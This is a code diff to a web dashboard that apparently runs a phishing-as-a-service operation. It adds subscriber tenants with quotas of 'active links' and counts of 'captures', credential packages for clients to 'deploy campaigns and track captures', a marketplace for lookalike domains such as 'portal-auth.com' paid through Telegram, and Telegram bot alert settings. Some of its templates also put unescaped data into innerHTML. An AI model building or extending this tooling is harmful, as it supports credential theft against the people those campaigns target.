+                    showClientOnboardingModal();
+                }, 1000);
+            }
+        }
+
         async function loadDashboard() {
             try {
                 // 1. Fetch user info
@@ -5956,6 +6525,9 @@ function closeAppConfirm(confirmed) {
                     const uRes = await fetch('/api/auth/me');
                     if (uRes.ok) {
                         const uData = await uRes.json();
+                        window._isClientAdmin = Boolean(uData.is_client_admin);
+                        window._isMasterAdmin = Boolean(uData.is_master_admin);
+                        window._currentUser = uData.username;
                         if (uData.username) {
                             const uEl = document.getElementById('dash-welcome-user');
                             if (uEl) {
@@ -5964,6 +6536,9 @@ function closeAppConfirm(confirmed) {
                                 else name = name.charAt(0).toUpperCase() + name.slice(1);
                                 uEl.innerText = name;
                             }
+                        }
+                        if (window._isClientAdmin) {
+                            checkClientSubscriberOnboarding();
                         }
                     }
                 } catch(e) {}
@@ -8168,7 +8743,6 @@ function closeAppConfirm(confirmed) {
                 resetAllEditorsToDefault();
             } catch(e) {
                 showToast('❌ Deploy error: ' + (e.message || e));
-                alert('Deploy error: ' + (e.message || e));
             }
         }
 
@@ -8388,6 +8962,10 @@ function closeAppConfirm(confirmed) {
 
         // ── DOMAIN STORE & MANAGER FUNCTIONS ─────────────────────────
         function openBuyDomainsModal() {
+            if (window._isClientAdmin) {
+                openBuyDomainRequestModal();
+                return;
+            }
             const m = document.getElementById('buyDomainsModal');
             if (m) {
                 m.classList.add('active');
@@ -8414,13 +8992,120 @@ function closeAppConfirm(confirmed) {
         }
 
         function switchDomainTab(tab) {
-            ['search', 'owned', 'manual'].forEach(t => {
+            ['search', 'owned', 'market', 'manual'].forEach(t => {
                 const btn = document.getElementById('tab-btn-' + t);
                 const pane = document.getElementById('dm-tab-pane-' + t);
                 if (btn) btn.classList.toggle('active', t === tab);
                 if (pane) pane.style.display = (t === tab ? 'flex' : 'none');
             });
             if (tab === 'owned') loadOwnedDomainsTable();
+            if (tab === 'market') loadMarketplaceTable();
+        }
+
+        async function loadMarketplaceTable() {
+            const tbody = document.getElementById('dm-marketplace-tbody');
+            if (!tbody) return;
+            try {
+                const res = await fetch('/api/lg/marketplace');
+                const domains = await res.json();
+                if (!domains || !domains.length) {
+                    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#a49498; padding:20px;">No marketplace listings right now.</td></tr>`;
+                    return;
+                }
+                tbody.innerHTML = domains.map(d => {
+                    const price = (d.price !== null && d.price !== undefined && String(d.price).trim() !== '') ? d.price : 'Contact admin';
+                    {% if is_master_admin %}
+                    const pendingTag = d.pending_buyer ? `<div style="font-size:11px; color:#ffcc66; margin-top:3px;">⏳ Requested by ${d.pending_buyer}</div>` : '';
+                    return `<tr>
+                        <td style="padding:10px 12px;"><strong style="color:#ffffff;">${d.domain}</strong>${pendingTag}</td>
+                        <td style="padding:10px 12px;">${d.registrar || '—'}</td>
+                        <td style="padding:10px 12px; color:#ffcc66; font-weight:700;">${price}</td>
+                        <td style="padding:10px 12px; text-align:right;">
+                            <button type="button" class="dm-btn" style="padding:4px 10px; font-size:0.72rem;" onclick="withdrawMarketplaceDomain('${d.domain}')">↩ Withdraw</button>
+                        </td>
+                    </tr>`;
+                    {% else %}
+                    const mine = d.pending_mine === true || d.pending_mine === 'true';
+                    const buyCell = mine
+                        ? `<span style="color:#ffcc66; font-weight:700; font-size:0.75rem;">⏳ Processing — complete via Telegram</span>`
+                        : `<button type="button" class="dm-btn" style="padding:4px 10px; font-size:0.72rem;" onclick="claimMarketplaceDomain('${d.domain}')">🛒 Buy Now</button>`;
+                    return `<tr>
+                        <td style="padding:10px 12px;"><strong style="color:#ffffff;">${d.domain}</strong></td>
+                        <td style="padding:10px 12px;">${d.registrar || '—'}</td>
+                        <td style="padding:10px 12px; color:#ffcc66; font-weight:700;">${price}</td>
+                        <td style="padding:10px 12px; text-align:right;">
+                            ${buyCell}
+                        </td>
+                    </tr>`;
+                    {% endif %}
+                }).join('');
+            } catch(e) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#a49498; padding:20px;">Failed to load marketplace.</td></tr>`;
+            }
+        }
+
+        async function claimMarketplaceDomain(domain) {
+            const ok = await appConfirm({
+                title: 'Buy Domain via Telegram',
+                message: `Request "${domain}" from the marketplace? You will be redirected to Telegram to complete the payment with the administrator. Once payment is confirmed, the domain becomes yours.`,
+                confirmText: 'Continue to Telegram',
+                icon: '🛒'
+            });
+            if (!ok) return;
+            try {
+                const res = await fetch(`/api/lg/marketplace/${encodeURIComponent(domain)}/request`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`⏳ ${domain} is now processing — complete payment via Telegram`);
+                    if (data.telegram_url) window.open(data.telegram_url, '_blank');
+                    loadMarketplaceTable();
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Request failed'));
+                }
+            } catch(e) { showToast('⚠️ Request error: ' + e); }
+        }
+
+        async function withdrawMarketplaceDomain(domain) {
+            const ok = await appConfirm({
+                title: 'Withdraw Listing?',
+                message: `Pull "${domain}" from the marketplace? It returns to your own private domain pool.`,
+                confirmText: 'Withdraw',
+                icon: '↩',
+                danger: true
+            });
+            if (!ok) return;
+            try {
+                const res = await fetch(`/api/lg/marketplace/${encodeURIComponent(domain)}/withdraw`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`✓ ${domain} withdrawn back to your domains`);
+                    loadMarketplaceTable();
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Withdraw failed'));
+                }
+            } catch(e) { showToast('⚠️ Withdraw error: ' + e); }
+        }
+
+        async function listDomainInMarketplace() {
+            const name = (document.getElementById('dm-market-add-name')?.value || '').trim().toLowerCase();
+            const price = (document.getElementById('dm-market-add-price')?.value || '').trim();
+            if (!name || !name.includes('.')) return showToast('⚠️ Please enter a valid domain (e.g. portal-auth.com)');
+            try {
+                const res = await fetch('/api/lg/marketplace/' + encodeURIComponent(name) + '/list', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ price: price })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`✓ ${name} listed in the marketplace`);
+                    const n = document.getElementById('dm-market-add-name'); if (n) n.value = '';
+                    const p = document.getElementById('dm-market-add-price'); if (p) p.value = '';
+                    loadMarketplaceTable();
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Listing failed'));
+                }
+            } catch(e) { showToast('⚠️ Listing error: ' + e); }
         }
 
         async function searchDomains() {
@@ -8460,7 +9145,7 @@ function closeAppConfirm(confirmed) {
                 if (box) box.style.display = 'block';
 
                 if (!list || !list.length || list[0]?.error) {
-                    const errMsg = list[0]?.error || 'No results returned or Namecheap API credentials not configured.';
+                    const errMsg = list[0]?.error || 'No results returned or Dynadot API key not configured / IP not whitelisted in Dynadot (Tools → API).';
                     tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#f87171; padding:20px;">
                         ⚠️ ${errMsg}<br><small style="color:#ff6b72;">You can manually register your domain with any registrar and add it using the "➕ Add Custom Domain" tab above.</small>
                     </td></tr>`;
@@ -8489,6 +9174,26 @@ function closeAppConfirm(confirmed) {
                 if (loading) loading.style.display = 'none';
                 if (box) box.style.display = 'block';
                 tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#f87171; padding:20px;">Search request failed: ${err}</td></tr>`;
+            }
+        }
+
+                async function saveDynadotApiKey() {
+            const key = (document.getElementById('dm-dynadot-key-input')?.value || '').trim();
+            showToast('Saving Dynadot API Key...');
+            try {
+                const res = await fetch('/api/settings/dynadot', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ dynadot_key: key })
+                });
+                const d = await res.json();
+                if (d.success) {
+                    showToast('✓ Dynadot API Key saved successfully!');
+                } else {
+                    showToast('⚠️ Failed to save key: ' + (d.error || 'Error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Error saving key: ' + e);
             }
         }
 
@@ -8528,22 +9233,28 @@ function closeAppConfirm(confirmed) {
             const pInput = document.getElementById('dm-custom-provider');
             const domain = (dInput?.value || '').trim().toLowerCase();
             const provider = (pInput?.value || 'Manual DNS').trim();
+            const marketCheck = document.getElementById('dm-custom-market-check');
+            const toMarket = !!(marketCheck && marketCheck.checked);
+            const marketPrice = toMarket ? ((document.getElementById('dm-custom-market-price')?.value || '').trim()) : '';
 
             if (!domain) return showToast('⚠️ Please enter a domain name');
             if (!domain.includes('.')) return showToast('⚠️ Please enter a valid domain (e.g. portal-auth.com)');
+            if (toMarket && !marketPrice) return showToast('⚠️ Please enter a marketplace price');
 
             try {
                 const res = await fetch('/api/lg/domains', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ domain: domain, registrar: provider })
+                    body: JSON.stringify({ domain: domain, registrar: provider, for_sale: toMarket, price: marketPrice })
                 });
                 const data = await res.json();
                 if (data.success) {
-                    showToast(`✓ Domain ${domain} added successfully!`);
+                    showToast(toMarket ? `✓ ${domain} listed in the marketplace!` : `✓ Domain ${domain} added successfully!`);
                     if (dInput) dInput.value = '';
+                    if (marketCheck) marketCheck.checked = false;
+                    const mp = document.getElementById('dm-custom-market-price'); if (mp) { mp.value = ''; mp.style.display = 'none'; }
                     await syncDomainsDropdown();
-                    switchDomainTab('owned');
+                    switchDomainTab(toMarket ? 'market' : 'owned');
                 } else {
                     showToast('⚠️ Failed to add domain: ' + (data.error || 'Unknown error'));
                 }
@@ -8559,14 +9270,14 @@ function closeAppConfirm(confirmed) {
                 const res = await fetch('/api/lg/domains');
                 const domains = await res.json();
                 if (!domains || !domains.length) {
-                    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:#a49498; padding:20px;">No domains registered yet. Buy one with Namecheap or add a custom domain.</td></tr>`;
+                    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:#a49498; padding:20px;">No domains registered yet. Buy one with Dynadot or add a custom domain.</td></tr>`;
                     return;
                 }
                 tbody.innerHTML = domains.map(d => {
                     const isNs = d.ns_configured === 1 || d.ns_configured === true;
                     return `<tr>
                         <td><strong style="color:#ffffff;">${d.domain}</strong></td>
-                        <td>${d.registrar || 'Namecheap'}</td>
+                        <td>${d.registrar || 'Dynadot'}</td>
                         <td>
                             <button type="button" class="dm-btn dm-btn-secondary" style="padding:4px 8px; font-size:0.72rem; ${isNs ? 'border-color:#10b981; color:#34d399;' : ''}" onclick="toggleDomainNs('${d.domain}', ${isNs ? 0 : 1})">
                                 ${isNs ? '✅ Configured' : '⏳ Pending'}
@@ -8649,10 +9360,8 @@ function closeAppConfirm(confirmed) {
                         return dl.includes('127.0.0.1') || dl.includes('localhost') || dl.includes('ngrok') || dl.includes('loca.lt') || dl.includes('trycloudflare');
                     };
 
-                    // Filter domains: in production, exclude all localhost/tunnels
-                    const validDomains = isLocal
-                        ? rawDomains
-                        : rawDomains.filter(d => !isTunnelDomain(d.domain));
+                    // All explicitly registered domains from database should appear in the dropdown
+                    const validDomains = rawDomains;
 
                     let opts = '';
 
@@ -9069,12 +9778,15 @@ function closeAppConfirm(confirmed) {
         // ════════════════════════════════════════════════════════════════
         async function loadSettings() {
             try {
+                const isClient = Boolean(window._isClientAdmin);
+                const settingsUrl = isClient ? '/api/client/settings' : '/api/settings';
                 let s = {};
                 try {
-                    const r = await fetch('/api/settings');
+                    const r = await fetch(settingsUrl);
                     if (r.ok) s = await r.json();
                 } catch(e) {}
-                const local = JSON.parse(localStorage.getItem('crimson_paw_settings') || '{}');
+                const storageKey = isClient ? ('crimson_settings_client_' + (window._currentUserId || 'sub')) : 'crimson_paw_settings_admin';
+                const local = JSON.parse(localStorage.getItem(storageKey) || '{}');
                 const cfg = { ...local, ...s };
 
                 const userEl = document.getElementById('settings-current-username');
@@ -9083,6 +9795,17 @@ function closeAppConfirm(confirmed) {
                 if (cfg.tg_bot_token && document.getElementById('setting-tg-bot-token')) document.getElementById('setting-tg-bot-token').value = cfg.tg_bot_token;
                 if (cfg.tg_chat_id && document.getElementById('setting-tg-chat-id')) document.getElementById('setting-tg-chat-id').value = cfg.tg_chat_id;
                 if (typeof cfg.notify_token !== 'undefined' && document.getElementById('setting-notify-token')) document.getElementById('setting-notify-token').checked = cfg.notify_token;
+                if (typeof cfg.marketplace_telegram_contact !== 'undefined' && document.getElementById('setting-marketplace-tg')) document.getElementById('setting-marketplace-tg').value = cfg.marketplace_telegram_contact || '';
+
+                // Guarantee at least one settings pane is visible
+                let hasActive = false;
+                ['account', '2fa', 'telegram', 'theme'].forEach(function(t) {
+                    const p = document.getElementById('settings-pane-' + t);
+                    if (p && p.style.display !== 'none') hasActive = true;
+                });
+                if (!hasActive && typeof window.switchSettingsTab === 'function') {
+                    window.switchSettingsTab('account');
+                }
             } catch (e) {
                 console.error('loadSettings error:', e);
             }
@@ -9201,7 +9924,17 @@ Please keep your access key confidential.`;
             navigator.clipboard.writeText(text).then(() => {
                 showToast('✓ Full credentials package copied to clipboard!');
             }).catch(() => {
-                alert(text);
+                try {
+                    const temp = document.createElement('textarea');
+                    temp.value = text;
+                    document.body.appendChild(temp);
+                    temp.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(temp);
+                    showToast('✓ Full credentials package copied to clipboard!');
+                } catch(e) {
+                    showToast('⚠️ Clipboard access denied by browser.');
+                }
             });
         }
 
@@ -9341,6 +10074,610 @@ Please keep your access key confidential.`;
 
             html += '</tbody></table>';
             return html;
+        }
+
+        // ─── Dual Tab Team Switcher ──────────────────────────────────────────
+        function switchTeamTab(tab) {
+            const btnOps = document.getElementById('tab-btn-team-operators');
+            const btnSubs = document.getElementById('tab-btn-team-subscribers');
+            const viewOps = document.getElementById('view-team-operators');
+            const viewSubs = document.getElementById('view-team-subscribers');
+
+            if (tab === 'operators') {
+                if (btnOps) {
+                    btnOps.style.background = 'var(--accent-gradient)';
+                    btnOps.style.color = '#ffffff';
+                    btnOps.style.boxShadow = '0 2px 8px var(--accent-glow)';
+                }
+                if (btnSubs) {
+                    btnSubs.style.background = 'transparent';
+                    btnSubs.style.color = 'var(--text-secondary)';
+                    btnSubs.style.boxShadow = 'none';
+                }
+                if (viewOps) viewOps.style.display = 'flex';
+                if (viewSubs) viewSubs.style.display = 'none';
+                loadOperators();
+            } else {
+                if (btnSubs) {
+                    btnSubs.style.background = 'var(--accent-gradient)';
+                    btnSubs.style.color = '#ffffff';
+                    btnSubs.style.boxShadow = '0 2px 8px var(--accent-glow)';
+                }
+                if (btnOps) {
+                    btnOps.style.background = 'transparent';
+                    btnOps.style.color = 'var(--text-secondary)';
+                    btnOps.style.boxShadow = 'none';
+                }
+                if (viewOps) viewOps.style.display = 'none';
+                if (viewSubs) viewSubs.style.display = 'flex';
+                loadSubscribers();
+            }
+        }
+
+        // ─── Subscribed Client SaaS Frontend Logic ──────────────────────────
+        let _allSubscribersCache = [];
+
+        async function loadSubscribers() {
+            try {
+                const res = await fetch('/api/admin/subscribers');
+                if (!res.ok) {
+                    const c = document.getElementById('subscribers-page-table-container');
+                    if (c) c.innerHTML = '<div style="padding:16px; color:#ff6b72;">Failed to load subscribers (Master SuperAdmin access required).</div>';
+                    return;
+                }
+                const data = await res.json();
+                _allSubscribersCache = data.subscribers || [];
+                updateSubscriberKpis(_allSubscribersCache);
+                filterSubscribersList();
+            } catch (err) {
+                const c = document.getElementById('subscribers-page-table-container');
+                if (c) c.innerHTML = `<div style="padding:16px; color:#ff6b72;">Error loading subscribers: ${err}</div>`;
+            }
+        }
+
+        function updateSubscriberKpis(subs) {
+            let active = 0, expiring = 0, frozen = 0, domains = 0;
+            subs.forEach(s => {
+                if (s.status === 'frozen') frozen++;
+                else if (s.is_expired) frozen++;
+                else {
+                    active++;
+                    if (s.days_remaining <= 3) expiring++;
+                }
+                domains += (s.domain_list || []).length;
+            });
+            const elActive = document.getElementById('sub-kpi-active');
+            const elExp = document.getElementById('sub-kpi-expiring');
+            const elDom = document.getElementById('sub-kpi-domains');
+            const elFroz = document.getElementById('sub-kpi-frozen');
+            if (elActive) elActive.textContent = active;
+            if (elExp) elExp.textContent = expiring;
+            if (elDom) elDom.textContent = domains;
+            if (elFroz) elFroz.textContent = frozen;
+        }
+
+        function filterSubscribersList() {
+            const query = (document.getElementById('sub-search-filter') ? document.getElementById('sub-search-filter').value : '').toLowerCase().trim();
+            let filtered = _allSubscribersCache;
+            if (query) {
+                filtered = _allSubscribersCache.filter(s => 
+                    (s.username || '').toLowerCase().includes(query) ||
+                    (s.plan_name || '').toLowerCase().includes(query) ||
+                    (s.domain_list || []).some(d => d.toLowerCase().includes(query))
+                );
+            }
+            renderSubscribersTable(filtered);
+        }
+
+        function renderSubscribersTable(subs) {
+            const container = document.getElementById('subscribers-page-table-container');
+            if (!container) return;
+            if (!subs.length) {
+                container.innerHTML = '<div style="padding:32px; text-align:center; color:var(--text-secondary);">No subscribed clients found. Click "Add Subscribed Client" to provision a tenant.</div>';
+                return;
+            }
+
+            let html = `
+                <table class="table" style="width:100%; border-collapse:collapse; font-size:12.5px;">
+                    <thead>
+                        <tr style="border-bottom:1px solid var(--border-color); text-align:left; color:var(--text-secondary); text-transform:uppercase; font-size:10px; letter-spacing:0.06em;">
+                            <th style="padding:12px 14px;">CLIENT / TENANT</th>
+                            <th style="padding:12px 14px;">PLAN</th>
+                            <th style="padding:12px 14px;">SUBSCRIPTION STATUS</th>
+                            <th style="padding:12px 14px;">ACTIVE LINKS</th>
+                            <th style="padding:12px 14px;">ASSIGNED DOMAINS</th>
+                            <th style="padding:12px 14px; text-align:right;">ACTIONS</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            subs.forEach(s => {
+                const isFrozen = s.status === 'frozen';
+                const domCount = (s.domain_list || []).length;
+                const domBadge = domCount > 0 
+                    ? `<button type="button" class="btn btn-secondary btn-sm" onclick="openManageDomainsModal(${s.id}, '${escapeHtml(s.username)}')" style="padding:2px 8px; font-size:11px; display:inline-flex; align-items:center; gap:4px;">🌐 ${domCount} Assigned</button>`
+                    : `<button type="button" class="btn btn-secondary btn-sm" onclick="openManageDomainsModal(${s.id}, '${escapeHtml(s.username)}')" style="padding:2px 8px; font-size:11px; opacity:0.6;">➕ None (Assign)</button>`;
+
+                html += `
+                    <tr style="border-bottom:1px solid var(--border-color); transition:background 0.2s;" onmouseover="this.style.background='rgba(255,255,255,0.02)'" onmouseout="this.style.background='transparent'">
+                        <td style="padding:12px 14px;">
+                            <div style="font-weight:700; color:#ffffff; font-family:monospace; font-size:13px;">${escapeHtml(s.username)}</div>
+                            <div style="font-size:10.5px; color:var(--text-secondary); margin-top:2px;">Created: ${escapeHtml((s.created_at || '').substring(0, 10))}</div>
+                        </td>
+                        <td style="padding:12px 14px;">
+                            <span style="background:var(--badge-bg); border:1px solid var(--badge-border); color:var(--accent-color); padding:3px 8px; border-radius:6px; font-weight:700; font-size:11px;">${escapeHtml(s.plan_name || 'Pro')}</span>
+                        </td>
+                        <td style="padding:12px 14px;">
+                            <div class="sub-live-timer" data-expires="${escapeHtml(s.subscription_expires_at || '')}" data-frozen="${isFrozen ? '1' : '0'}" style="display:inline-flex; align-items:center; gap:6px; font-family:'Courier New', monospace; font-size:11.5px; font-weight:700; padding:4px 8px; border-radius:6px; background:rgba(0,0,0,0.3); border:1px solid var(--border-color);">
+                                Calculating...
+                            </div>
+                            <div style="font-size:10.5px; color:var(--text-secondary); margin-top:3px; font-family:monospace;">
+                                📅 ${s.subscription_expires_at ? 'Expires: ' + escapeHtml(s.subscription_expires_at) : 'Lifetime (No Expiry)'}
+                            </div>
+                        </td>
+                        <td style="padding:12px 14px;">
+                            <span style="font-weight:700; color:#ffffff;">${s.deployment_count || 0}</span> / <span style="color:var(--text-secondary);">${s.max_deployments || 15}</span>
+                            <div style="font-size:10px; color:var(--text-secondary);">${s.capture_count || 0} captures</div>
+                        </td>
+                        <td style="padding:12px 14px;">
+                            ${domBadge}
+                        </td>
+                        <td style="padding:12px 14px; text-align:right;">
+                            <div style="display:inline-flex; align-items:center; gap:6px;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="copySubscriberPortalPackage(${s.id})" title="Copy client credentials & portal link" style="padding:4px 8px; font-size:11px; display:inline-flex; align-items:center; gap:4px; color:#58a6ff; border-color:rgba(88,166,255,0.3);">
+                                    📋 Copy Package
+                                </button>
+                                <button type="button" class="btn btn-primary btn-sm" onclick="openRenewModal(${s.id}, '${escapeHtml(s.username)}')" title="Extend subscription" style="padding:4px 8px; font-size:11px; display:inline-flex; align-items:center; gap:4px;">
+                                    <span>⏳</span> Renew
+                                </button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="toggleClientFreeze(${s.id}, ${!isFrozen})" title="${isFrozen ? 'Restore account' : 'Freeze account'}" style="padding:4px 8px; font-size:11px;">
+                                    ${isFrozen ? '🟢 Unfreeze' : '❄️ Freeze'}
+                                </button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="deleteSubscriber(${s.id}, '${escapeHtml(s.username)}')" title="Delete client" style="padding:4px 8px; font-size:11px; color:#ef4444; border-color:rgba(239,68,68,0.3);">
+                                    🗑️
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+            updateSubscriberLiveTimers();
+            startSubscriberTicker();
+        }
+
+        let _subTickerInterval = null;
+        function startSubscriberTicker() {
+            if (_subTickerInterval) clearInterval(_subTickerInterval);
+            _subTickerInterval = setInterval(updateSubscriberLiveTimers, 1000);
+        }
+
+        function updateSubscriberLiveTimers() {
+            const els = document.querySelectorAll('.sub-live-timer');
+            const now = Date.now();
+            els.forEach(el => {
+                if (el.dataset.frozen === '1') {
+                    el.innerHTML = '<span style="color:#ef4444;">❄️ Frozen</span>';
+                    return;
+                }
+                const expStr = el.dataset.expires;
+                if (!expStr) {
+                    el.innerHTML = '<span style="color:#3fb950;">♾️ Lifetime</span>';
+                    return;
+                }
+                const expTime = new Date(expStr.replace(' ', 'T')).getTime();
+                const diff = expTime - now;
+                if (diff <= 0) {
+                    el.innerHTML = '<span style="color:#ef4444; font-weight:800;">🔴 Expired (00d 00h 00m 00s)</span>';
+                    return;
+                }
+                const d = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const s = Math.floor((diff % (1000 * 60)) / 1000);
+
+                const pad = (n) => String(n).padStart(2, '0');
+                const timeStr = `${d}d ${pad(h)}h ${pad(m)}m ${pad(s)}s`;
+
+                if (d <= 3) {
+                    el.innerHTML = `⏳ <span style="color:#ff9f43; text-shadow:0 0 6px rgba(255,159,67,0.3);">${timeStr}</span>`;
+                } else {
+                    el.innerHTML = `🟢 <span style="color:#3fb950; text-shadow:0 0 6px rgba(63,185,80,0.3);">${timeStr}</span>`;
+                }
+            });
+        }
+
+        function rollSubscriberUsername() {
+            const prefixes = [
+                'Apex', 'Vanguard', 'Skyline', 'Titan', 'Aero', 'Horizon', 'Delta', 'Pinnacle', 'Summit',
+                'Nexus', 'Cipher', 'Quantum', 'Vector', 'Astral', 'Eclipse', 'Polaris', 'Zephyr', 'Orion',
+                'Stratus', 'Aura', 'Novus', 'Prism', 'Cobalt', 'Phoenix', 'Omni', 'Krypton', 'Vertex', 'Solas'
+            ];
+            const suffixes = [
+                'Lead', 'Alpha', 'Ops', 'HQ', 'Secure', 'Net', 'Corp', 'Labs', 'Group', 'Prime',
+                'Systems', 'Global', 'Tech', 'Holdings', 'Ventures', 'Dynamics', 'Cloud', 'Logic', 'Shield'
+            ];
+            const p = prefixes[Math.floor(Math.random() * prefixes.length)];
+            const s = suffixes[Math.floor(Math.random() * suffixes.length)];
+            const user = p + s;
+            const el = document.getElementById('sub-username-input');
+            if (el) el.value = user;
+        }
+
+        function rollSubscriberPassword() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%';
+            let pass = '';
+            for (let i = 0; i < 14; i++) {
+                pass += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const el = document.getElementById('sub-password-input');
+            if (el) el.value = pass;
+        }
+
+        function openNewSubscriberModal() {
+            rollSubscriberUsername();
+            rollSubscriberPassword();
+            const el = document.getElementById('subscriberModal');
+            if (el) el.classList.add('active');
+        }
+
+        function closeSubscriberModal() {
+            const el = document.getElementById('subscriberModal');
+            if (el) el.classList.remove('active');
+        }
+
+        let _lastCreatedClientCredentials = {};
+
+        function openClientCredentialsModal(username, password, plan, quota, expires_at) {
+            _lastCreatedClientCredentials = {
+                portalUrl: window.location.origin + '/client/login',
+                username: username,
+                password: password,
+                plan: plan,
+                quota: quota,
+                expires_at: expires_at
+            };
+            const urlEl = document.getElementById('sub-cred-url');
+            const userEl = document.getElementById('sub-cred-user');
+            const passEl = document.getElementById('sub-cred-pass');
+            const planEl = document.getElementById('sub-cred-plan');
+            const expEl = document.getElementById('sub-cred-expiry');
+            if (urlEl) urlEl.innerText = _lastCreatedClientCredentials.portalUrl;
+            if (userEl) userEl.innerText = username;
+            if (passEl) passEl.innerText = password;
+            if (planEl) planEl.innerText = `${plan} (${quota} Max Active Links)`;
+            if (expEl) expEl.innerText = expires_at ? expires_at : 'Lifetime';
+
+            const modal = document.getElementById('clientCredentialsModal');
+            if (modal) modal.classList.add('active');
+        }
+
+        function closeClientCredentialsModal() {
+            const modal = document.getElementById('clientCredentialsModal');
+            if (modal) modal.classList.remove('active');
+        }
+
+        function copyClientCredentialsPackage() {
+            const c = _lastCreatedClientCredentials;
+            if (!c.username) return;
+            const text = 
+`💼 CLIENT PORTAL ACCESS PACKAGE
+────────────────────────────────────────
+Portal Login URL: ${c.portalUrl}
+Client Username:  ${c.username}
+Login Password:   ${c.password}
+Subscription:     ${c.plan}
+Active Links:     ${c.quota} Max Quota
+Expires On:       ${c.expires_at || 'Lifetime (No Expiry)'}
+────────────────────────────────────────
+Log in to your private portal to deploy campaigns and track captures.`;
+
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('✓ Client credentials & portal package copied to clipboard!');
+            }).catch(() => {
+                try {
+                    const temp = document.createElement('textarea');
+                    temp.value = text;
+                    document.body.appendChild(temp);
+                    temp.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(temp);
+                    showToast('✓ Client credentials & portal package copied to clipboard!');
+                } catch(e) {
+                    showToast('⚠️ Clipboard access denied by browser.');
+                }
+            });
+        }
+
+        function copySubscriberPortalPackage(subId) {
+            const sub = (_allSubscribersCache || []).find(s => s.id === subId);
+            if (!sub) return;
+            const portalUrl = window.location.origin + '/client/login';
+            const savedPass = (_lastCreatedClientCredentials.username === sub.username) ? _lastCreatedClientCredentials.password : '[Configured at Provisioning]';
+            const text = 
+`💼 CLIENT PORTAL ACCESS PACKAGE
+────────────────────────────────────────
+Portal Login URL: ${portalUrl}
+Client Username:  ${sub.username}
+Login Password:   ${savedPass}
+Subscription:     ${sub.plan_name || 'Pro'}
+Active Links:     ${sub.max_deployments || 15} Max Quota
+Expires On:       ${sub.subscription_expires_at || 'Lifetime (No Expiry)'}
+Status:           ${(sub.status || 'active').toUpperCase()}
+────────────────────────────────────────
+Log in to your private portal to deploy campaigns and track captures.`;
+
+            navigator.clipboard.writeText(text).then(() => {
+                showToast(`✓ Portal access package for ${sub.username} copied!`);
+            }).catch(() => {
+                try {
+                    const temp = document.createElement('textarea');
+                    temp.value = text;
+                    document.body.appendChild(temp);
+                    temp.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(temp);
+                    showToast(`✓ Portal access package for ${sub.username} copied!`);
+                } catch(e) {
+                    showToast('⚠️ Clipboard copy failed.');
+                }
+            });
+        }
+
+        async function saveSubscriber(e) {
+            e.preventDefault();
+            const username = document.getElementById('sub-username-input').value.trim();
+            const password = document.getElementById('sub-password-input').value;
+            const duration_days = document.getElementById('sub-duration-input').value;
+            const plan_name = document.getElementById('sub-plan-input').value;
+            const max_deployments = document.getElementById('sub-quota-input').value;
+
+            try {
+                const res = await fetch('/api/admin/subscribers/create', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, duration_days, plan_name, max_deployments })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    closeSubscriberModal();
+                    await loadSubscribers();
+                    openClientCredentialsModal(username, password, plan_name, max_deployments, data.expires_at);
+                    showToast(`✓ Client subscriber "${username}" provisioned successfully!`);
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Failed to create subscriber'));
+                }
+            } catch (err) {
+                showToast('⚠️ Network error: ' + err);
+            }
+        }
+
+        function openRenewModal(cid, username) {
+            document.getElementById('renew-client-id').value = cid;
+            document.getElementById('renew-client-name').textContent = username;
+            document.getElementById('renew-modal-title').textContent = `Renew Subscription: ${username}`;
+            const el = document.getElementById('renewSubscriberModal');
+            if (el) el.classList.add('active');
+        }
+
+        function closeRenewModal() {
+            const el = document.getElementById('renewSubscriberModal');
+            if (el) el.classList.remove('active');
+        }
+
+        async function executeRenewQuick(days) {
+            const cid = document.getElementById('renew-client-id').value;
+            try {
+                const res = await fetch(`/api/admin/subscribers/${cid}/renew`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ days })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    closeRenewModal();
+                    loadSubscribers();
+                    showToast(`✓ Extended subscription by +${days} days! New expiry: ${data.expires_at.substring(0, 10)}`);
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Renewal failed'));
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        async function executeRenewCustom() {
+            const cid = document.getElementById('renew-client-id').value;
+            const customDate = document.getElementById('renew-custom-date').value;
